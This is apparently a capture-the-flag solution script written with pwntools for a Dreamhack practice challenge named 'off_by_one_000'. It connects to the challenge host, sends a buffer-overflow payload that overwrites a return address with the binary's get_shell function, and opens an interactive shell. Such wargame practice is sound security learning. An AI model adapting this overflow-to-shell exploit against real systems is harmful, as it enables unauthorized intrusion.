from pwn import *

p=remote('host1.dreamhack.games',16895)
e=ELF('off_by_one_000')
get_shell=e.symbols['get_shell']

#context.log_level='debug'

log.info("get_shell: "+hex(get_shell))

p.recvuntil("Name: ")

payload="A"*0x94
payload+=p32(get_shell)
payload+="B"*104

#raw_input()

p.send(payload)

p.interactive()

#raw_input()